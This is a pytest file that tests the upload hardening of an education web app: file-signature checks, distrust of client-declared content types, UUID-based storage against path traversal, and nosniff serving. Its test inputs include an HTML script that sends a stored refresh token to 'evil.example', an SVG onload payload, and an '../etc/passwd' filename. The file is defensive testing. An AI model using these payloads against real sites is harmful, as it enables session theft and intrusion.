"""Uploads as they arrive over HTTP.

`test_upload_file_type.py` covers the signature check in isolation; this file
asserts the endpoints actually apply it, and that a stored file never carries
a name the uploader chose. Both would fail before the fix -- the savers
checked the extension and nothing else.
"""

from pathlib import Path

import pytest
from sqlalchemy import select

from app.core import storage
from app.models.user import RoleEnum, User

PNG = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR" + b"\x00" * 64
HTML_PAYLOAD = (
    b"<html><script>fetch('https://evil.example/?t='+localStorage.getItem("
    b"'edunation_refresh_token'))</script></html>"
)


@pytest.fixture(autouse=True)
def uploads_in_tmp(tmp_path, monkeypatch):
    """Redirects every upload directory into the test's own tmp_path, so the
    suite never writes into the real `backend/uploads` tree."""
    monkeypatch.setattr(storage, "UPLOAD_ROOT", tmp_path)
    for name, sub in [
        ("HOMEWORK_DIR", "homework"),
        ("CATEGORY_IMAGE_DIR", "categories"),
        ("AVATAR_DIR", "avatars"),
        ("ENT_QUESTION_IMAGE_DIR", "ent-questions"),
        ("LESSON_CONTENT_IMAGE_DIR", "lesson-content"),
    ]:
        monkeypatch.setattr(storage, name, tmp_path / sub)
    return tmp_path


async def test_html_renamed_to_png_is_rejected(client, make_user, login_as, uploads_in_tmp):
    """The stored-XSS route: a script file under an image name, served back
    from the app's own origin where it can read the session."""
    user = await make_user(RoleEnum.student)
    login_as(user)

    response = await client.post(
        "/api/v1/me/avatar",
        files={"file": ("avatar.png", HTML_PAYLOAD, "image/png")},
    )

    assert response.status_code == 400
    assert not list((uploads_in_tmp / "avatars").glob("*")) if (uploads_in_tmp / "avatars").exists() else True


async def test_client_supplied_content_type_is_not_believed(client, make_user, login_as):
    """The browser sends whatever the form says. Declaring image/png over a
    script body must not be what decides the file is an image."""
    user = await make_user(RoleEnum.student)
    login_as(user)

    response = await client.post(
        "/api/v1/me/avatar",
        files={"file": ("avatar.png", b"<svg onload=alert(1)></svg>", "image/png")},
    )
    assert response.status_code == 400


async def test_genuine_image_is_accepted(client, db_session, make_user, login_as, uploads_in_tmp):
    """The check has to let real uploads through, or it gets removed."""
    user = await make_user(RoleEnum.student)
    await db_session.commit()
    login_as(user)

    response = await client.post("/api/v1/me/avatar", files={"file": ("avatar.png", PNG, "image/png")})

    assert response.status_code == 200
    stored = await db_session.scalar(select(User.avatar_path).where(User.id == user.id))
    assert stored is not None


async def test_traversal_in_the_filename_never_reaches_the_path(
    client, db_session, make_user, login_as, uploads_in_tmp
):
    """`../../etc/passwd.png` is stored under a uuid, inside the avatars
    directory, and the original name is not used to build the path at all."""
    user = await make_user(RoleEnum.student)
    await db_session.commit()
    login_as(user)

    response = await client.post(
        "/api/v1/me/avatar",
        files={"file": ("../../../../etc/passwd.png", PNG, "image/png")},
    )

    assert response.status_code == 200
    stored = await db_session.scalar(select(User.avatar_path).where(User.id == user.id))
    assert stored.startswith("avatars/")
    assert ".." not in stored
    assert Path(stored).name.endswith(".png")
    # The uuid stem, not anything from the submitted name.
    assert "passwd" not in stored

    written = list((uploads_in_tmp / "avatars").glob("*"))
    assert len(written) == 1
    assert written[0].parent == uploads_in_tmp / "avatars"


async def test_avatar_is_served_with_sniffing_disabled(
    client, db_session, make_user, login_as, uploads_in_tmp
):
    """Even a file that passed the signature check is served with nosniff and
    a content type derived from our own stored name -- so a browser cannot be
    talked into rendering it as anything else."""
    user = await make_user(RoleEnum.student)
    await db_session.commit()
    login_as(user)
    await client.post("/api/v1/me/avatar", files={"file": ("a.png", PNG, "image/png")})

    response = await client.get(f"/api/v1/users/{user.id}/avatar")

    assert response.status_code == 200
    assert response.headers["x-content-type-options"] == "nosniff"
    assert response.headers["content-type"] == "image/png"


async def test_pdf_import_rejects_a_non_pdf_body(client, db_session, make_user, login_as):
    """The endpoint checked the filename and the declared Content-Type, both
    of which the uploader controls, before handing the bytes to pdfplumber."""
    from app.models.ent_subject import EntSubject

    teacher = await make_user(RoleEnum.teacher)
    subject = EntSubject(name="Математика", slug="math-upload-test", created_by_id=teacher.id)
    db_session.add(subject)
    await db_session.commit()

    login_as(teacher)
    response = await client.post(
        "/api/v1/teacher/ent/questions/import-pdf",
        data={"subject_id": str(subject.id)},
        files={"file": ("variants.pdf", HTML_PAYLOAD, "application/pdf")},
    )

    assert response.status_code == 400
